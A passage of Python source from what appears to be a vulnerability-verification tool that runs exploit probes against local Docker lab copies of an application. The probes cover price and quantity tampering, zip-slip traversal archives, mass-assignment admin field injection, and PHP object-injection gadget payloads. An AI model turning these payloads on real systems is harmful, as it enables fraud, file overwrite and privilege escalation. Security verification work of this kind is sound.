    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    price_param: str = "price",
    qty_param: str = "quantity",
    confirm_string: str = "",
    parameters: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica business logic via manipulacion de precio/cantidad en servidor.

    Estrategia multi-fase:
    1. Precio negativo: envia price=-1 y comprueba si el pedido se acepta
       (precio negativo suma credito, o el sistema acepta el total negativo)
    2. Cantidad negativa: envia qty=-1 y verifica si se procesa
    3. Precio cero: price=0.00 — acepta gratis
    4. Precio trucado: price=0.01 — acepta a 1 centimo
    5. Integer overflow: price=999999999 — suma overflow a valor negativo
    6. Parametro flotante como string: price=1e-100 — parsing inconsistente
    7. Control: precio normal debe rechazarse si la cantidad es invalida

    Confirmacion: status 200/201 diferente al control CON un mensaje de exito
    (confirm_string, 'order', 'success', 'created', 'accepted', 'total') en body.
    """
    import json as _json

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        base_params = dict(parameters or {})
        hdrs_json = {"Content-Type": "application/json"}
        hdrs_form = {"Content-Type": "application/x-www-form-urlencoded"}

        def _send_bl(overrides: dict) -> tuple:
            p = {**base_params, **overrides}
            if http_method == "GET":
                _st, _, _b = _http_lab(base_url, endpoint, "GET",
                                        params=p, timeout=15.0)
            else:
                _st, _, _b = _http_lab(base_url, endpoint, http_method,
                                        headers=hdrs_form,
                                        body="&".join(f"{k}={v}" for k, v in p.items()).encode(),
                                        timeout=15.0)
            return _st, (_b or b"").decode("utf-8", errors="replace")

        def _send_bl_json(overrides: dict) -> tuple:
            p = {**base_params, **overrides}
            _st, _, _b = _http_lab(base_url, endpoint, http_method,
                                    headers=hdrs_json,
                                    body=_json.dumps(p).encode(), timeout=15.0)
            return _st, (_b or b"").decode("utf-8", errors="replace")

        # Control: legitimate values to establish baseline
        ctrl_st, ctrl_body = _send_bl({price_param: "10.00", qty_param: "1"})
        step(f"BL control (price=10.00, qty=1): status={ctrl_st} len={len(ctrl_body)}")

        _SUCCESS_SIGNALS = {"order", "success", "created", "accepted", "total", "confirmed",
                            "checkout", "placed", "cart"}
        if confirm_string:
            _SUCCESS_SIGNALS.add(confirm_string.lower())

        def _is_success(st: int, body: str) -> bool:
            if confirm_string and confirm_string in body:
                return True
            if st in (200, 201, 202) and any(s in body.lower() for s in _SUCCESS_SIGNALS):
                return True
            return False

        attack_cases = [
            ("negative_price",     {price_param: "-1", qty_param: "1"}),
            ("zero_price",         {price_param: "0", qty_param: "1"}),
            ("one_cent_price",     {price_param: "0.01", qty_param: "1"}),
            ("negative_quantity",  {price_param: "10.00", qty_param: "-1"}),
            ("zero_quantity",      {price_param: "10.00", qty_param: "0"}),
            ("float_underflow",    {price_param: "1e-100", qty_param: "1"}),
            ("int_overflow_price", {price_param: "9999999999", qty_param: "1"}),
        ]

        for label, overrides in attack_cases:
            st, body = _send_bl(overrides)
            step(f"BL attack {label}: status={st} len={len(body)}")
            if _is_success(st, body):
                # Also try JSON body in case form didn't work
                step(f"BL CONFIRMADO via {label} (form-encoded)")
                res.verified = True
                res.ok = True
                res.evidence["bl_technique"] = label
                res.evidence["bl_params"] = overrides
                res.evidence["bl_response_snippet"] = body[:300]
                res.detail = (f"BUSINESS LOGIC CONFIRMADO ({label}): "
                              f"servidor acepto {overrides} en {endpoint} "
                              f"(status={st}) — control fue status={ctrl_st}")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + endpoint,
                    resp_or_body=body,
                    highlight=confirm_string or str(st),
                    caption_es=(f"BUSINESS LOGIC CONFIRMADO: {label} acepto "
                                f"valores manipulados en {endpoint}."),
                    caption_en=(f"BUSINESS LOGIC CONFIRMED: {label} accepted "
                                f"manipulated values at {endpoint}."),
                )
                return res
            # Also try JSON body
            st2, body2 = _send_bl_json(overrides)
            if _is_success(st2, body2):
                step(f"BL CONFIRMADO via {label} (JSON body)")
                res.verified = True
                res.ok = True
                res.evidence["bl_technique"] = label + "_json"
                res.evidence["bl_params"] = overrides
                res.evidence["bl_response_snippet"] = body2[:300]
                res.detail = (f"BUSINESS LOGIC CONFIRMADO ({label} JSON): "
                              f"servidor acepto {overrides} en {endpoint} "
                              f"(status={st2}) — control fue status={ctrl_st}")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + endpoint,
                    resp_or_body=body2,
                    highlight=confirm_string or str(st2),
                    caption_es=(f"BUSINESS LOGIC CONFIRMADO (JSON): {label}."),
                    caption_en=(f"BUSINESS LOGIC CONFIRMED (JSON): {label}."),
                )
                return res

        res.ok = True
        res.detail = (f"Business logic no detectado: {len(attack_cases)} casos probados "
                      f"en {endpoint} ({price_param}, {qty_param}), "
                      f"ninguno fue aceptado como exito")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_business_logic: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# Zip-slip (path traversal via archive extraction) verifier
# ---------------------------------------------------------------------------

def verify_generic_zip_slip(
    source_dir: str,
    upload_endpoint: str,
    http_method: str = "POST",
    file_param: str = "file",
    confirm_endpoint: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica zip-slip via archive extraction sin canonicalizacion de rutas.

    Mecanismo:
    1) Levanta el lab efimero.
    2) Crea un ZIP en memoria con una entrada '../../../tmp/<canary_file>' cuyo
       contenido es un token secreto aleatorio.
    3) Sube el ZIP al endpoint de upload.
    4) Comprueba si el token aparece en /tmp/<canary_file> o en la respuesta
       de un endpoint de confirmacion (confirm_endpoint).

    La confirmacion puede ser:
    - GET confirm_endpoint que devuelve el contenido del fichero
    - GET /api/file/<canary_file> (si el servidor sirve ficheros de /tmp)
    - Respuesta directa del upload (si el servidor procesa la extraccion inline)

    file_param:        nombre del campo multipart del ZIP
    confirm_endpoint:  endpoint para verificar que el fichero se escribio
    """
    import io as _io
    import zipfile as _zf
    import tarfile as _tf

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        canary_token = _token()
        canary_filename = f"zipslip_{canary_token[:8]}.txt"

        # Build traversal ZIP: entry name uses ../ to escape the extraction dir
        traversal_paths = [
            f"../../../tmp/{canary_filename}",
            f"../../tmp/{canary_filename}",
            f"../../../../tmp/{canary_filename}",
            f"../tmp/{canary_filename}",
            # Absolute path variant (some extractors follow absolute paths)
            f"/tmp/{canary_filename}",
        ]

        def _make_zip(tpath: str) -> bytes:
            buf = _io.BytesIO()
            with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
                zf.writestr(tpath, canary_token)
            buf.seek(0)
            return buf.read()

        def _make_tar(tpath: str) -> bytes:
            buf = _io.BytesIO()
            with _tf.open(fileobj=buf, mode="w:gz") as tf:
                content = canary_token.encode()
                info = _tf.TarInfo(name=tpath)
                info.size = len(content)
                tf.addfile(info, _io.BytesIO(content))
            buf.seek(0)
            return buf.read()

        # Try both ZIP and TAR.GZ variants
        _archive_variants = [
            ("zip", _make_zip, "application/zip", f"test_{canary_token[:8]}.zip"),
            ("tar.gz", _make_tar, "application/gzip", f"test_{canary_token[:8]}.tar.gz"),
        ]

        for traversal_path in traversal_paths:
            for _arc_type, _arc_builder, _arc_mime, _arc_filename in _archive_variants:
                arc_bytes = _arc_builder(traversal_path)
                step(f"zip-slip [{_arc_type}]: probando entrada {traversal_path!r} ({len(arc_bytes)}B)")

                # Upload the archive via multipart POST
                st, _, body_bytes = _http_lab(
                    base_url, upload_endpoint, http_method,
                    files={file_param: (_arc_filename, arc_bytes, _arc_mime)},
                    timeout=20.0)
                body = (body_bytes or b"").decode("utf-8", errors="replace")
                step(f"  upload response [{_arc_type}]: status={st} len={len(body)}")

            # Check 1: token in upload response (server processes inline)
            if canary_token in body:
                res.verified = True
                res.ok = True
                res.evidence["zipslip_path"] = traversal_path
                res.evidence["zipslip_token"] = canary_token
                res.detail = (f"ZIP-SLIP CONFIRMADO (inline): token {canary_token!r} en "
                              f"respuesta del upload via entry {traversal_path!r}")
                step("VERIFICADO: zip-slip — token en respuesta del upload")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + upload_endpoint,
                    resp_or_body=body, highlight=canary_token,
                    caption_es=(f"ZIP-SLIP CONFIRMADO: entrada {traversal_path!r} "
                                f"traverso fuera del directorio de extraccion."),
                    caption_en=(f"ZIP-SLIP CONFIRMED: entry {traversal_path!r} "
                                f"traversed outside extraction directory."),
                )
                return res

            # Check 2: probe confirm_endpoint
            if confirm_endpoint:
                s2, _, b2 = _http_lab(base_url, confirm_endpoint, "GET", timeout=10.0)
                body2 = (b2 or b"").decode("utf-8", errors="replace")
                if canary_token in body2:
                    res.verified = True
                    res.ok = True
                    res.evidence["zipslip_path"] = traversal_path
                    res.evidence["zipslip_token"] = canary_token
                    res.detail = (f"ZIP-SLIP CONFIRMADO (fichero escritura): token {canary_token!r} "
                                  f"en {confirm_endpoint} — extraccion wrote fuera del directorio")
                    step(f"VERIFICADO: zip-slip — token en {confirm_endpoint}")
                    _add_exploit_evidence(
                        res=res, method="GET", url=base_url + confirm_endpoint,
                        resp_or_body=body2, highlight=canary_token,
                        caption_es=(f"ZIP-SLIP CONFIRMADO: fichero escrito en {traversal_path!r}."),
                        caption_en=(f"ZIP-SLIP CONFIRMED: file written to {traversal_path!r}."),
                    )
                    return res

            # Check 3: try to fetch the written file via common patterns
            for probe_ep in [
                f"/tmp/{canary_filename}",
                f"/api/files/{canary_filename}",
                f"/uploads/../tmp/{canary_filename}",
                f"/static/../tmp/{canary_filename}",
            ]:
                s3, _, b3 = _http_lab(base_url, probe_ep, "GET", timeout=8.0)
                if s3 == 200 and canary_token in ((b3 or b"").decode("utf-8", errors="replace")):
                    res.verified = True
                    res.ok = True
                    res.evidence["zipslip_path"] = traversal_path
                    res.evidence["zipslip_written_at"] = probe_ep
                    res.evidence["zipslip_token"] = canary_token
                    res.detail = (f"ZIP-SLIP CONFIRMADO (fichero servido): token en {probe_ep} "
                                  f"— extraccion escribio fuera del directorio via {traversal_path!r}")
                    step(f"VERIFICADO: zip-slip — fichero servido en {probe_ep}")
                    _add_exploit_evidence(
                        res=res, method="GET", url=base_url + probe_ep,
                        resp_or_body=(b3 or b"").decode("utf-8", errors="replace"),
                        highlight=canary_token,
                        caption_es=f"ZIP-SLIP CONFIRMADO: fichero en {probe_ep}.",
                        caption_en=f"ZIP-SLIP CONFIRMED: file at {probe_ep}.",
                    )
                    return res

        res.ok = True
        res.detail = (f"zip-slip no detectado: {len(traversal_paths)} variantes de traversal "
                      f"probadas en {upload_endpoint} (param={file_param!r}), "
                      f"token canario no apareció fuera del directorio de extracción")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_zip_slip: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


def verify_generic_multistep(
    source_dir: str,
    steps: list,
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "",
    extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Multi-step HTTP chain verifier for flows that require extracting a token/nonce
    from one request and using it in a subsequent request.

    ``steps`` is a list of step dicts, each with:
      - method (str): "GET" | "POST" | "PUT" etc.
      - endpoint (str): path relative to lab base URL, e.g. "/auth/login"
      - params (dict, optional): query params
      - body (dict | str, optional): request body (dict → JSON)
      - headers (dict, optional): extra request headers
      - extract (dict, optional): {var_name: "re:<pattern>"} — extract from response body
        using the first capture group of the regex and store in context dict
      - extract_header (dict, optional): {var_name: "Header-Name"} — extract from response header
      - confirm_string (str, optional): if present, assert this string is in the response body

    Variables from earlier steps can be referenced in later steps as "{{var_name}}" in any
    string value of params/body/headers/endpoint.

    Example:
      steps = [
        {"method": "GET", "endpoint": "/login",
         "extract": {"nonce": "re:nonce\\s*=\\s*['\"]([a-f0-9]{8,16})['\"]"}},
        {"method": "POST", "endpoint": "/api/action",
         "body": {"nonce": "{{nonce}}", "action": "admin_takeover"},
         "confirm_string": "admin_takeover_ok"},
      ]
    """
    res = WpVerifyResult()
    step = on_step or (lambda _: None)
    t0 = time.time()

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "Docker no disponible"
        res.limitations.append("Docker daemon no encontrado o no arrancado")
        return res

    lab = None
    try:
        _boot = _bootstrap_generic_lab(
            source_dir, step, res, budget_s,
            dockerfile_body=dockerfile_body,
            extra_files=extra_files,
        )
        if _boot is None:
            return res
        lab, base_url, _container = _boot

        import requests as _rq
        sess = _rq.Session()
        sess.verify = False
        ctx: dict = {}  # extracted variables from previous steps

        def _interpolate(val):
            if isinstance(val, str):
                for k, v in ctx.items():
                    val = val.replace(f"{{{{{k}}}}}", v)
            elif isinstance(val, dict):
                return {k2: _interpolate(v2) for k2, v2 in val.items()}
            elif isinstance(val, list):
                return [_interpolate(i) for i in val]
            return val

        for i, s in enumerate(steps):
            if time.time() - t0 > budget_s:
                res.detail = f"presupuesto agotado antes del step {i+1}"
                return res

            method   = (s.get("method") or "GET").upper()
            endpoint = _interpolate(s.get("endpoint") or "/")
            params   = _interpolate(s.get("params") or {})
            body_raw = _interpolate(s.get("body") or {})
            headers  = _interpolate(s.get("headers") or {})
            step_confirm = _interpolate(s.get("confirm_string") or "")
            extract      = s.get("extract") or {}
            extract_hdr  = s.get("extract_header") or {}
            url = base_url + (endpoint if endpoint.startswith("/") else "/" + endpoint)

            step(f"[multistep step {i+1}/{len(steps)}] {method} {endpoint}")
            try:
                json_body = isinstance(body_raw, dict) and body_raw
                data_body = body_raw if isinstance(body_raw, str) else None
                resp = sess.request(
                    method, url,
                    params=params,
                    json=json_body if json_body else None,
                    data=data_body,
                    headers=headers,
                    timeout=30,
                    allow_redirects=True,
                )
            except Exception as e:
                res.detail = f"error en step {i+1} ({method} {endpoint}): {e}"
                return res

            body_text = resp.text or ""
            step(f"  → HTTP {resp.status_code}, {len(body_text)}B")

            # Extract variables for next steps
            for var_name, pattern in extract.items():
                if pattern.startswith("re:"):
                    m = re.search(pattern[3:], body_text)
                    if m:
                        ctx[var_name] = m.group(1) if m.lastindex else m.group(0)
                        step(f"  extracted {var_name}={ctx[var_name]!r:.50}")
                    else:
                        step(f"  [WARN] extract pattern for '{var_name}' not found in response")
                elif pattern.startswith("json:"):
                    # JSON path: "json:data.login_nonce" navigates nested dict
                    try:
                        import json as _jq
                        _jobj = _jq.loads(body_text)
                        for _jkey in pattern[5:].split("."):
                            _jobj = _jobj[_jkey] if isinstance(_jobj, dict) else _jobj[int(_jkey)]
                        ctx[var_name] = str(_jobj)
                        step(f"  extracted json {var_name}={ctx[var_name]!r:.50}")
                    except Exception as _je:
                        step(f"  [WARN] json extract '{pattern}' failed: {_je!r:.50}")
                elif pattern.startswith("header:"):
                    _hval = resp.headers.get(pattern[7:].strip(), "")
                    if _hval:
                        ctx[var_name] = _hval
                        step(f"  extracted header {var_name}={ctx[var_name]!r:.50}")
                    else:
                        step(f"  [WARN] header '{pattern[7:]}' not found in response")
                else:
                    ctx[var_name] = pattern  # static value

            for var_name, hdr_name in extract_hdr.items():
                val = resp.headers.get(hdr_name, "")
                if val:
                    ctx[var_name] = val
                    step(f"  extracted header {var_name}={val!r:.50}")

            # Per-step confirmation check
            if step_confirm and step_confirm not in body_text:
                res.detail = (f"step {i+1}: confirm_string {step_confirm!r} "
                              f"not found in response")
                return res

        # Final step: check overall confirm_string
        final_body = body_text  # from last step
        if confirm_string and confirm_string in final_body:
            res.verified = True
            res.ok = True
            res.confidence = "confirmed"
            res.evidence["tecnica"] = "multistep-chain"
            res.evidence["steps_executed"] = len(steps)
            res.evidence["ctx_extracted"] = {k: v[:80] for k, v in ctx.items()}
            res.detail = (f"MULTI-STEP CHAIN CONFIRMADO: {len(steps)} pasos ejecutados, "
                          f"confirm_string {confirm_string!r} presente en la respuesta final")
            step(f"VERIFICADO: multi-step chain ({len(steps)} pasos)")
        elif not confirm_string:
            # No confirm_string: success = all steps completed without error
            res.verified = True
            res.ok = True
            res.confidence = "probable"
            res.evidence["tecnica"] = "multistep-chain-no-confirm"
            res.evidence["steps_executed"] = len(steps)
            res.detail = (f"MULTI-STEP CHAIN: {len(steps)} pasos completados sin error "
                          f"(sin confirm_string — resultado no duro)")
            step(f"COMPLETADO: multi-step chain ({len(steps)} pasos) sin confirm_string")
        else:
            res.ok = True
            res.confidence = "inconclusive"
            res.detail = (f"multi-step chain: {len(steps)} pasos ejecutados pero "
                          f"confirm_string {confirm_string!r} no encontrado en respuesta final")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_multistep: {e}"
        res.confidence = "not_reproducible"
        return res
    finally:
        step("desmontando el laboratorio generico (multistep)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# Mass Assignment verifier
# Covers CVEs where privileged fields (role, isAdmin, is_superuser, group, …)
# can be injected via a user-controlled JSON/form body on registration/update
# endpoints.  Examples: CVE-2023-22621 (Strapi admin reg), CVE-2019-11503
# (Ghost role escalation), countless Node.js / Laravel / DRF API CVEs.
# ---------------------------------------------------------------------------

#: Privileged fields to inject per framework/stack family
_MASS_ASSIGN_FIELD_SETS = [
    # Generic escalation fields (try first — broad coverage)
    {"role": "admin", "is_admin": True, "isAdmin": True},
    {"role": "superuser", "is_superuser": True, "isSuperUser": True},
    # Strapi-style: role integer ID → 1 = authenticated, 3 = superAdmin
    {"role": {"id": 3, "type": "superAdmin"}, "blocked": False, "confirmed": True},
    # Ghost-style: roles array with role object
    {"roles": [{"id": "1", "name": "Administrator"}]},
    # Laravel/DRF style
    {"group": "admin", "groups": ["admin"], "permissions": ["admin"]},
    # Django auth
    {"is_staff": True, "is_superuser": True},
    # Node.js / Mongoose style
    {"admin": True, "superAdmin": True, "type": "admin"},
    # Ruby on Rails Pundit/CanCan
    {"role": "admin", "admin": True},
    # Directus: roles are UUIDs; probe admin role UUID placeholder
    {"role": "00000000-0000-0000-0000-000000000000"},
    # Audiobookshelf: type field
    {"type": "admin", "isAdmin": True},
    # h3 / Nuxt / generic JS: scope field
    {"scope": "admin", "access_level": 99, "privilege": "admin"},
    # Django REST Framework: user_type or account_type
    {"user_type": "admin", "account_type": "admin"},
]

#: Patterns that confirm the FIELD VALUE (not just key name) indicates admin was set.
#: These are checked against the response body — require key+admin-value together.
_MASS_ASSIGN_ADMIN_SIGNALS = [
    '"role":"admin"', '"role": "admin"',
    '"role":"superAdmin"', '"role": "superAdmin"',
    '"role":"superuser"', '"role": "superuser"',
    '"isAdmin":true', '"isAdmin": true',
    '"is_admin":true', '"is_admin": true',
    '"is_staff":true', '"is_staff": true',
    '"is_superuser":true', '"is_superuser": true',
    '"admin":true', '"admin": true',
    '"superAdmin":true', '"superAdmin": true',
    '"type":"admin"', '"type": "admin"',
    '"scope":"admin"', '"scope": "admin"',
]


def verify_generic_mass_assignment(
    source_dir: str,
    register_endpoint: str = "/api/auth/local/register",
    login_endpoint: str = "/api/auth/local",
    profile_endpoint: str = "",
    http_method: str = "POST",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    pkg_version: str = "",
) -> WpVerifyResult:
    """Verifica mass assignment en endpoints de registro / actualización de perfil.

    Estrategia de 3 fases:
      1. Registrar usuario normal (sin campos privilegiados) → extrae token + user_id
      2. Para cada conjunto de campos privilegiados: intentar inyectarlos en el
         cuerpo de registro / actualización de perfil
      3. Verificar si la respuesta revela campos admin == True, o si un GET al
         perfil devuelve campos privilegiados activos

    La verificación se da cuando:
      - La respuesta de registro contiene señales de rol admin, o
      - confirm_string aparece en la respuesta, o
      - _analyze_response_body detecta señales de privilegio con ≥60% confianza
    """
    import json as _json
    import time as _time

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(
        source_dir, step, res, budget_s,
        dockerfile_body=dockerfile_body, extra_files=extra_files,
        pkg_version=pkg_version,
    )
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token_id = _token()
        base_email = f"binoracle-{token_id}@test.local"
        base_password = f"BinOracle!{token_id[:6]}"

        # ── Phase 1: register a clean baseline user ───────────────────────────
        step(f"[mass-assign] fase 1: registro baseline en {register_endpoint}")
        baseline_body = _json.dumps({
            "username": f"user-{token_id}",
            "email": base_email,
            "password": base_password,
        })
        try:
            r0 = _http_request(
                "POST", base_url.rstrip("/") + register_endpoint,
                data=baseline_body,
                headers={"Content-Type": "application/json"},
                timeout=15,
            )
            baseline_status = r0.status_code
            baseline_body_text = getattr(r0, "text", "") or ""
        except Exception as e:
            res.detail = f"error de red en registro baseline: {e}"
            return res

        step(f"  baseline status={baseline_status} len={len(baseline_body_text)}")

        # Extract JWT from baseline response for Phase 3 (profile read)
        baseline_jwt = ""
        try:
            baseline_data = _json.loads(baseline_body_text)
            baseline_jwt = (baseline_data.get("jwt") or
                            baseline_data.get("token") or
                            baseline_data.get("access_token") or "")
        except Exception:
            pass

        # ── Phase 2: probe each privileged field set ──────────────────────────
        for field_set in _MASS_ASSIGN_FIELD_SETS:
            tok_this = _token()
            probe_email = f"probe-{tok_this}@test.local"
            probe_body = {
                "username": f"probe-{tok_this}",
                "email": probe_email,
                "password": base_password,
            }
            # Merge privileged fields into registration body
            probe_body.update(field_set)
            probe_json = _json.dumps(probe_body)
            field_names = ", ".join(str(k) for k in field_set)
            step(f"  probando inyección de campos: [{field_names}]")

            try:
                r = _http_request(
                    "POST", base_url.rstrip("/") + register_endpoint,
                    data=probe_json,
                    headers={"Content-Type": "application/json"},
                    timeout=15,
                )
                st = r.status_code
                body_text = getattr(r, "text", "") or ""
            except Exception:
                continue

            step(f"    → status={st}")

            if st not in range(200, 300):
                # 4xx might mean fields were rejected (good) or bad input (noise)
                continue

            # Check confirm_string first
            string_ok = confirm_string and confirm_string in body_text
            # Check for admin field signals in response
            admin_signals = [s for s in _MASS_ASSIGN_ADMIN_SIGNALS if s.lower() in body_text.lower()]
            # Semantic analysis
            analysis = _analyze_response_body(
                body_text, "missing-authorization",
                payload=_json.dumps(field_set), confirm_string=confirm_string,
                status_code=st,
            )

            if string_ok or admin_signals or (not confirm_string and not admin_signals and analysis.get("partial_confidence", 0) >= 0.90):
                res.verified = True
                res.ok = True
                res.evidence = {
                    "technique": "mass-assignment",
                    "injected_fields": field_set,
                    "register_endpoint": register_endpoint,
                    "status": st,
                    "admin_signals_found": admin_signals[:5],
                    "response_body_snippet": body_text[:600],
                    "response_analysis": analysis if analysis.get("interesting") else {},
                }
                diag_parts = []
                if admin_signals:
                    diag_parts.append(f"admin_signals={admin_signals[:3]}")
                if string_ok:
                    diag_parts.append(f"confirm_string='{confirm_string}'")
                if analysis.get("interesting"):
                    diag_parts.append(f"semantico={analysis['partial_confidence']:.0%}")
                res.detail = (
                    f"MASS ASSIGNMENT CONFIRMADO: campos [{field_names}] aceptados "
                    f"por {register_endpoint} (HTTP {st}) — "
                    + "; ".join(diag_parts)
                )
                step(f"VERIFICADO: mass assignment via [{field_names}]")

                # Phase 3: if we got a JWT, verify the account actually got admin role
                if profile_endpoint:
                    probe_jwt = ""
                    try:
                        pd = _json.loads(body_text)
                        probe_jwt = (pd.get("jwt") or pd.get("token") or
                                     pd.get("access_token") or "")
                    except Exception:
                        pass
                    if probe_jwt:
                        step(f"  fase 3: verificando perfil en {profile_endpoint}")
                        try:
                            rp = _http_request(
                                "GET", base_url.rstrip("/") + profile_endpoint,
                                headers={"Authorization": f"Bearer {probe_jwt}"},
                                timeout=10,
                            )
                            profile_body = getattr(rp, "text", "") or ""
                            profile_admin_signals = [
                                s for s in _MASS_ASSIGN_ADMIN_SIGNALS
                                if s.lower() in profile_body.lower()
                            ]
                            if profile_admin_signals:
                                res.evidence["profile_verification"] = {
                                    "endpoint": profile_endpoint,
                                    "status": rp.status_code,
                                    "admin_signals": profile_admin_signals[:5],
                                    "body_snippet": profile_body[:300],
                                }
                                res.detail += (f"\n\nFase 3 (perfil): señales admin "
                                               f"confirmadas en GET {profile_endpoint}: "
                                               f"{profile_admin_signals[:3]}")
                                step(f"  perfil confirma privilegios: {profile_admin_signals[:3]}")
                        except Exception:
                            pass
                return res

            _time.sleep(0.3)  # Small delay to avoid 429

        # ── Phase 2b: try PUT/PATCH update on existing user profile ───────────
        if baseline_jwt and profile_endpoint:
            step(f"[mass-assign] fase 2b: PUT/PATCH profile en {profile_endpoint}")
            for field_set in _MASS_ASSIGN_FIELD_SETS[:4]:  # Top priority sets only
                update_body = _json.dumps(field_set)
                for m_method in ("PUT", "PATCH"):
                    try:
                        ru = _http_request(
                            m_method, base_url.rstrip("/") + profile_endpoint,
                            data=update_body,
                            headers={
                                "Content-Type": "application/json",
                                "Authorization": f"Bearer {baseline_jwt}",
                            },
                            timeout=12,
                        )
                        if ru.status_code in range(200, 300):
                            update_body_text = getattr(ru, "text", "") or ""
                            update_signals = [
                                s for s in _MASS_ASSIGN_ADMIN_SIGNALS
                                if s.lower() in update_body_text.lower()
                            ]
                            if update_signals and len(update_signals) >= 2:
                                field_names = ", ".join(str(k) for k in field_set)
                                res.verified = True
                                res.ok = True
                                res.evidence = {
                                    "technique": "mass-assignment-profile-update",
                                    "injected_fields": field_set,
                                    "update_endpoint": profile_endpoint,
                                    "http_method": m_method,
                                    "admin_signals_found": update_signals[:5],
                                    "response_body_snippet": update_body_text[:400],
                                }
                                res.detail = (
                                    f"MASS ASSIGNMENT VIA {m_method} PERFIL CONFIRMADO: "
                                    f"campos [{field_names}] aceptados en {profile_endpoint} "
                                    f"(HTTP {ru.status_code}) — señales admin: {update_signals[:3]}"
                                )
                                step(f"VERIFICADO: mass assignment {m_method} profile")
                                return res
                    except Exception:
                        pass

        res.ok = True
        res.detail = (
            f"mass assignment no detectado: {len(_MASS_ASSIGN_FIELD_SETS)} conjuntos "
            f"de campos privilegiados probados en {register_endpoint} sin señales admin"
        )
        return res

    except Exception as e:
        res.detail = f"error inesperado en verify_generic_mass_assignment: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (mass-assignment)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# PHP Object Injection verifier
# Tests unserialize() of user input with classic gadget chain payloads.
# Covering: sleep canary (timing), filesystem read, RCE via __wakeup(),
# PHAR deserialization, common WordPress/Joomla gadget classes.
# ---------------------------------------------------------------------------

#: PHP serialized payloads per impact class.
#: Each entry: (label, serialized_payload, detection_strategy)
#: "time" = timing (sleep in __wakeup), "content" = file content in response,
#: "error" = PHP error message in response (class not found = unser ran)
_POI_PAYLOADS = [
    # 1. Canary: unexistent class — if PHP unserializes it, error or warning appears
    #    "Class 'BinOracleCanary' not found" in response → unserialize ran
    (
        "canary-class-not-found",
        'O:16:"BinOracleCanary":0:{}',
        "error",
        "BinOracleCanary",
    ),
    # 2. Sleep canary: __wakeup() sleep(3) gadget (requires a matching class in target)
    #    Generic enough to match generic stdClass chains; real timing verifies it
    (
        "sleep-wakeup-canary",
        'O:8:"stdClass":1:{s:3:"cmd";s:11:"sleep(3);/*";}',
        "time",
        "",
    ),
    # 3. WordPress Widgets gadget — WP_Widget subclass, __wakeup reads option
    (
        "wp-widget-class",
        'O:9:"WP_Widget":1:{s:2:"id";s:16:"binoracle_canary";}',
        "error",
        "WP_Widget",
    ),
    # 4. Monolog RCE gadget (common in Laravel/Symfony/WP-CLI contexts):
    #    Monolog\Handler\SyslogUdpHandler __destruct → triggers fwrite
    (
        "monolog-syslog-gadget",
        'O:29:"Monolog\\Handler\\SyslogUdpHandler":1:{s:6:"socket";i:0;}',
        "error",
        "SyslogUdpHandler",
    ),
    # 5. PHAR metadata deserialization trigger — simulates a file:// PHAR access
    #    (combined with file_get_contents/fopen gadget, out of scope for HTTP test)
    (
        "phar-metadata-trigger",
        'a:1:{s:4:"phar";s:30:"phar://./binoracle_test.phar/x";}',
        "error",
        "phar://",
    ),
]


def verify_generic_php_object_injection(
    source_dir: str,
    endpoint: str = "/",
    inject_param: str = "",
    http_method: str = "POST",
    auth_required: bool = False,
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    pkg_version: str = "",
) -> WpVerifyResult:
    """Verifica PHP Object Injection mediante unserialize() de input de usuario.

    Estrategia de 3 capas:
      1. Canary de clase inexistente: PHP emite 'Class not found' cuando el
         payload llega a unserialize() — confirma el vector sin necesitar gadgets.
      2. Timing canary: mide latencia de respuesta con payload sleep vs. sin payload.
         Delta ≥ 2.5s con 3 repeticiones → confirmado.
      3. Gadget chains conocidas: Monolog, WP_Widget, stdClass con cmd → comprueba
         si el error menciona el nombre de clase del gadget.

